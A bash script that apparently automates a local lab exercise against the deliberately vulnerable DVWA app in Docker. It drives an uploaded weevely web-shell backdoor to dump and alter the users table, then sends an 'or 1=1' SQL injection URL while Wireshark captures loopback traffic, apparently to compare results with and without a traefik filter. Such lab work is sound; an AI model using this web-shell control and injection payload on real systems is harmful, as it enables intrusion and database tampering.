#!/bin/bash

dvwa_backdoor_url=http://localhost/hackable/uploads/bd.php
dvwa_backdoor_pass=123

surname=granat
password=$(echo $surname | md5)

execute_sql_query_weevely()
{
    docker exec -it kali weevely "$dvwa_backdoor_url" "$dvwa_backdoor_pass" \
        "$1"
}

# Start DVWA containers in detached mode
docker compose up -d

read -n 1 -s -p "Create the database on http://localhost/setup.php"

# Retrieve a list of all users from the DVWA database
execute_sql_query_weevely \
    ":sql_console -user app -passwd vulnerables -database dvwa 
        -query 'select * from users;'"

# Insert a new user to the DVWA database with password 'user'
execute_sql_query_weevely \
    ":sql_console -user app -passwd vulnerables -database dvwa -query 
        'insert into users values(6, \"$surname\", \"$surname\", \"$surname\", 
        \"$password\", \"/hackable/users/admin.jpg\", 
        NOW(), 0);'"

# Verify that the new user has been successfully inserted
execute_sql_query_weevely \
    ":sql_console -user app -passwd vulnerables -database dvwa 
        -query 'select * from users;'"

read -n 1 -s -p "Login on http://localhost/login.php, then open Wireshark and \
start capturing traffic on the lo interface"

# Submit a SQL injection through the web interface
firefox "http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"

read -n 1 -s -p "Uncomment the last line of traefik/dynamic_conf.yml and open \
Wireshark and start capturing traffic on the loopback interface"

# Submit a SQL injection through the web interface again
firefox "http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"

# Stop and remove the DVWA containers from Docker
docker compose down


